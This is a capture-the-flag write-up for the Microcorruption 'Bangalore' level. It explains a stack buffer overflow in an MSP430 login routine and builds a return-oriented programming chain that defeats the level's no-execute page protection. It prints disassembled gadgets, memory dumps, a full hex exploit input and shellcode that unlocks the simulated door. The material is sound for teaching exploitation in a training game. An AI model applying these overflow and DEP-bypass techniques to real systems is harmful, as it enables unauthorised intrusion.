# For bangalore in microcorruption

In this challenge, we are introduced a new form of protection against hacking.

>   Lockitall engineers  have worked for  over a year to  bring memory
    protection to  the MSP430---a  truly amazing achievement.  Each of
    the 256  pages can  either be executable  or writeable,  but never
    both, finally  bringing to  a close  some of  the issues  in prior
    versions.

This is known as NX and DEP. In this challenge, the function `44de <set_up_protection>` sets up the protection. It calls 3 different functions which doe as their respective names imply.

1. `449c <mark_page_writable>`
2. `44b4 <mark_page_executable>`
3. `44cc <turn_on_dep>`

### Analysis of the program

```
4512 <login>
4512:  3150 f0ff      add	#0xfff0, sp
4516:  3f40 0024      mov	#0x2400, r15
451a:  b012 7a44      call	#0x447a <puts>	# Enter the password to continue.
451e:  3f40 2024      mov	#0x2420, r15
4522:  b012 7a44      call	#0x447a <puts>	# Remember: passwords are between 8 and 16 characters.
4526:  3e40 3000      mov	#0x30, r14
452a:  0f41           mov	sp, r15
452c:  b012 6244      call	#0x4462 <getsn>	# getsn(sp, 48 characters)
4530:  3f40 6524      mov	#0x2465, r15
4534:  b012 7a44      call	#0x447a <puts>	# That password is not correct.
4538:  3150 1000      add	#0x10, sp
453c:  3041           ret
```
No matter what our password is, it will always be "incorrect".

The 17th character in our input will override the return address of `<login>`. We can control program flow after `<login>` returns. The memory dump below shows the memory after giving `aaaaabbbbbcccccdddddeeeeefffffggggghhhhhiiiiijjjjjkkkkklllll` as the input. The input is truncated to 48 characters.
```
3fe0:   7444 0000 0000 0a00 9644 0000 3845 6161   tD.......D..8Eaa
3ff0:   6161 6162 6262 6262 6363 6363 6364 6464   aaabbbbbcccccddd
4000:   6464 6565 6565 6566 6666 6666 6767 6767   ddeeeeefffffgggg
4010:   6768 6868 6868 6969 6969 696a 6a6a 0000   ghhhhhiiiiijjj..
4020:   *
```
After `<login>` returns, the `pc` is loaded with the 17th & 18th characters of the input.
```
pc  6464 
```

Now we only need to find the correct function(s) to call. There is just one problem; there is *no* function to call to unlock the door. There is no ASLR enabled here, so we can smash the stack to point back to our input. Even though the stack is writable and not executable, why don't we just make it executable again with `44b4 <mark_page_executable>` to execute our shellcode? 

> Return-oriented programming (ROP) is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection.

To do so, we need to do some [ROPing](https://en.wikipedia.org/wiki/Return-oriented_programming). We have 2 different ROP gadgets. After that, our shellcode in the stack will become executable.

- Gadget A:
```
4508:  3b41           pop	r11
450a:  3041           ret
```
This will pop the memory page we want to be made executable into `r11`. 

- Gadget B:
```
44f6:  0f4b           mov	r11, r15
44f8:  b012 b444      call	#0x44b4 <mark_page_executable>
44fc:  1b53           inc	r11
44fe:  3b90 0001      cmp	#0x100, r11
4502:  f923           jne	#0x44f6 <set_up_protection+0x18>
[...]
450a:  3041           ret
```
Gadget B takes the value of `r11` (set by Gadget A) and makes all the pages between it and page 0x100 executable.

Hold up. What do you mean by "page"?

>Some version of the LockIT Pro contain memory protection which allows each
of the 256 pages to be either executable or writable, but never both.
[source](https://microcorruption.com/manual.pdf)

A [page](https://en.wikipedia.org/wiki/Page_(computer_memory)) is a continuous block of virtual memory of fixed length. In this challenge, there are a total of `0x10000` bytes (from `0x0000` to `0xffff`). Since the manual states that there are `0x100` pages, each page is `0x100` bytes large.

```
44e6:  1b43           mov	#0x1, r11
44e8:  0f4b           mov	r11, r15
44ea:  b012 9c44      call	#0x449c <mark_page_writable>
44ee:  1b53           inc	r11
44f0:  3b90 4400      cmp	#0x44, r11
44f4:  f923           jne	#0x44e8 <set_up_protection+0xa>
```
The snippet of code above shows that pages 1 to 44 (ie addresses `0x100` to `0x4400` are made writable). The stack is initialised to be in address `0x4000`, which makes sense because it must be writable. Otherwise, the program would not be able to key in values into the stack to pass as arguments to a function. Hang on a minute. Do you realise how I contradicted myself? We know that no area of memory can be *both* writable and executable. The stack, which lies around memory `0x4000` *must* be writable, so if we make it executable to execute our shellcode, the program is no longer able to function because it can't write anything into memory. It would give us the error: `Segmentation Fault: can not write to execute-only page.`.

We have to write our shellcode somewhere else (say address `0x4200` where it is writable, and not in the same page as the stack). It cannot be in the same page as the stack because when we make its page executable, it will leave the stack writable. To write into address `0x4200`, we shall call `getsn(0x4200, 8)` to read 8 characters into address `0x4200`. We read 8 characters because it is the length of our shellcode.

- Gadget C
```
4462 <getsn>
[...]
4468:  3180 0600      sub	#0x6, sp
446c:  3240 0082      mov	#0x8200, sr
4470:  b012 1000      call	#0x10
4474:  3150 0a00      add	#0xa, sp
4478:  3041           ret
```

After that, we make page 42 (ie address `0x4200` to `0x42ff`) executable with Gadget A and B. Then, the ROP chain returns to our shellcode in address `0x4200`.

> The interrupt kind is passed in R2, the status register, on the high byte. Arguments are passed
on the stack.
[source](https://microcorruption.com/manual.pdf)

This is our shellcode, which is equivalent to calling `INT 0x7F`.
```
mov #0xFF00, sr;	# INT 0x7F
call #0x10;

In hex: 324000ffb0121000
```

### Winning input

Putting all these together, we can craft the exploit below.

1st input: `6161616161616161616161616161616168440042080008454200f644ffff0042`

2nd input: `324000ffb0121000`

Let me dissect the input for you.

- `61616161616161616161616161616161` is the padding. 
- `684400420800` returns to Gadget C with the arguments `0x4200` and `0x8`. This is where we key in Input 2. 
- `08454200` pops `0042` into `r11`. 
- `f644` returns into Gadget B to make address `0x4200` to `0xffff` executable so we can execute our shellcode. 
- `0042` returns to the shellcode in address `0x4200`. It unlocks the door.

END
